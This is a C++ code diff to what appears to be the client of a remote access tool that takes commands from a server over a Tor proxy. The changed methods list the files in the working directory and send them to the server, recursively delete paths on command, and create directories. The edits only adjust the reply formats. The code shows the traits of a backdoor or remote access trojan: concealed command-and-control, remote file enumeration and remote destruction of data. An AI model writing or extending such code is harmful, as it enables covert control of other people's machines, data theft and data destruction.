@@ -211,11 +211,11 @@ public:
 
     /*
         Sends a list of files and folders in the current working directory to the server
-        Response format: "ls;<file1>;<file2>;<file3>;..."
+        Response format: "ls;<response size>;<file1>;<file2>;<file3>;..."
         Folders have "/" appended to the end of their name
     */
     void ls() {
-        std::string response = "ls;";
+        std::string response;
         for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) { // For every entry in an iterator of files in the current directory
             response += entry.path().filename().string(); // Add the filename to the response
             if (entry.is_directory()) { // If the entry is a directory, append a "/" to the end of the filename
@@ -223,7 +223,7 @@ public:
             }
             response += ";"; // Add a semicolon to the end of the filename to separate it from the next one
         }
-        this->torSock.proxySendStr(response); // Send the response to the server
+        this->torSock.proxySendStr("ls;" + std::to_string(response.size()) + ";" + response);
     }
 
     /*
@@ -240,14 +240,15 @@ public:
         Will delete recursively, use with care!
     */
     void rm(std::string path) {
-        if (std::filesystem::is_directory(path) && path.back() != '\\') {
-            path += "\\";
+        std::string pathReal = path; // If adjustments are required, we dont modify the original path (the server expects to get exactly the same path it sent as the response)
+        if (std::filesystem::is_directory(pathReal) && pathReal.back() != '\\') {
+            pathReal += "\\";
         }
-        this->torSock.proxySendStr("rm;" + path + ((std::filesystem::remove_all(path)) ? ";success;" : ";failed;"));
+        this->torSock.proxySendStr("rm;" + path + ((std::filesystem::remove_all(pathReal)) ? ";success;" : ";failed;"));
     }
 
     void mkdir(std::string path) {
-        this->torSock.proxySendStr("mkdir;" + path + ((std::filesystem::create_directories(path)) ? ";success;" : ";failed;"));
+        this->torSock.proxySendStr("mkdir;" + path + ((std::filesystem::create_directories(path)) ? "/;success;" : ";failed;"));
     }
 
     /*
